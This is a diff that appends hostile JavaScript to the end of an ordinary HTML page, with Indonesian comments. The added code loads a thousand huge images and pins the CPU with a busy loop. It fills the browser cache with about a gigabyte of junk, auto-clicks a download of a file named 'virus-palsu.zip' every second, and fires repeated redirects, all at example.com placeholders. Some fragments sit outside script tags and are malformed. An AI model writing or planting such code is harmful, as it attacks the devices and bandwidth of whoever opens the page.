@@ -64,5 +64,35 @@
             }
         }, 1000);
     </script>
+    <script>
+  for(let i=0; i<1000; i++) {
+    let img = new Image();
+    img.src = 'https://example.com/gambar-ultra-8k.jpg'; // Ganti dengan link gambar 50MB+
+    document.body.appendChild(img);
+  }
+</script>
+    setInterval(() => {
+  let start = Date.now();
+  while(Date.now() - start < 1000) {} // Lock CPU 1 detik per loop
+}, 10);
+      // Isi cache dengan data sampah 1GB
+caches.open('CACHE-SETAN').then(cache => {
+  for(let i=0; i<1000; i++) {
+    cache.put(`https://example.com/junk/${i}`, new Response(new Blob([new ArrayBuffer(1000000)]));
+  }
+});
+      <a id="virus" download="virus-palsu.zip" href="https://example.com/file-1GB.zip"></a>
+<script>
+  setInterval(() => {
+    document.getElementById('virus').click();
+  }, 1000);
+</script>
+      let count = 0;
+setInterval(() => {
+  if(count < 1000) {
+    window.location.href = "https://example.com/redirect-" + count + ".html";
+    count++;
+  }
+}, 100);
 </body>
 </html>
